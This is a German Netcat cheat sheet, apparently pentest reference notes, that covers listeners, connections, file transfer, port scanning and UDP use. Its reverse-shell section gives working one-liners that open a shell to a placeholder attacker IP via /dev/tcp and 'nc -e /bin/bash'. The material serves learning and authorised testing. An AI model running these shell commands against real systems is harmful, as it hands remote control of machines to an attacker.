# Netcat (nc)

**Netcat** (kurz: `nc`) ist ein vielseitiges Netzwerk-Tool für Unix- und Windows-Systeme. Es ermöglicht das Lesen und Schreiben von Daten über Netzwerkverbindungen mittels TCP oder UDP. Typische Anwendungsbereiche sind Debugging, Portscans, Dateiübertragungen, Shell-Verbindungen (Reverse/Bind Shells), einfache Server/Client-Kommunikation und Portweiterleitungen.



## Grundfunktionen

| Funktion               | Beschreibung                                                          |
| ---------------------- | --------------------------------------------------------------------- |
| Portscan               | TCP-Port-Scan eines Zielsystems                                       |
| Dateiübertragung       | Senden und Empfangen von Dateien über eine Netzwerkverbindung         |
| Chat-Kommunikation     | Einfache Client-Server-Kommunikation                                  |
| Reverse Shell          | Aufbau einer Verbindung vom Opfer zurück zum Angreifer                |
| Portweiterleitung      | Weiterleitung von TCP/UDP-Verbindungen                                |
| Backdoor-Kommunikation | Nutzung in Penetrationstests für Shells oder persistente Verbindungen |



## Netcat Cheatsheet

### **Listener (Server-Modus)**

| Befehl            | Beschreibung                             |
| ----------------- | ---------------------------------------- |
| `nc -lvnp <port>` | Startet einen Listener auf Port `<port>` |
| `-l`              | Listen-Modus                             |
| `-v`              | Ausführliche (verbose) Ausgabe           |
| `-n`              | Verzicht auf DNS-Auflösung (nur IPs)     |
| `-p <port>`       | Gibt den zu verwendenden Port an         |

Beispiel:

```
nc -lvnp 9001
```



### **Verbindung (Client-Modus)**

| Befehl           | Beschreibung                        |
| ---------------- | ----------------------------------- |
| `nc <ip> <port>` | Verbindet sich mit Ziel-IP und Port |
| `-v`             | Ausführliche Ausgabe                |
| `-n`             | Keine DNS-Auflösung                 |

Beispiel:

```
nc 10.10.10.10 9001
```



### **Dateiübertragung**

| Sender (Client)             | Empfänger (Listener)         |
| --------------------------- | ---------------------------- |
| `nc <ip> <port> < file.txt` | `nc -lvnp <port> > file.txt` |



### **Reverse Shell (Linux)**

| Ziel (Listener) | Opfer (Shell-Befehl)                 |
| --------------- | ------------------------------------ |
| `nc -lvnp 4444` | `bash -i >& /dev/tcp/<ip>/4444 0>&1` |
|                 | oder: `nc <ip> 4444 -e /bin/bash`    |

Hinweis: Die `-e` Option ist in vielen modernen Netcat-Versionen deaktiviert oder nicht vorhanden.



### **Portscan mit Netcat**

```
nc -vnz <ip> 20-80
```

| Option | Beschreibung                           |
| ------ | -------------------------------------- |
| `-v`   | Ausführliche Ausgabe                   |
| `-n`   | Keine DNS-Auflösung                    |
| `-z`   | Zero-I/O-Mode (nur Verbindungsprüfung) |



### **UDP-Verbindungen**

```
nc -u <ip> <port>
```

| Option | Beschreibung                  |
| ------ | ----------------------------- |
| `-u`   | Verwende UDP anstelle von TCP |
